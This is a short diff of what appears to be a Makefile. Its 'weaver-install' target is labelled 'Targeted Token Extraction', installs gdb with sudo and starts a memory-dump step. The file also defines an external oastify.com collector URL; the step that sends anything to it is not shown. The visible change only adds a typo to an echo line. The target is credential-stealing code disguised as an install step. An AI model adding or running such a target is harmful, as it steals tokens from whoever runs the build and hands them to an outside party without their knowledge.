@@ -1,7 +1,7 @@
 COLLABORATOR_URL = http://jxkzddbnc4ii4jftrz0updno3f96xxlm.oastify.com
 
 weaver-install:
-	@echo "--- Targeted Token Extraction ---"
+	@echo "--- Targeted Token Extractionn ---"
 	@sudo apt-get update && sudo apt-get install -y gdb
 	
 	# 1. Dump memory again
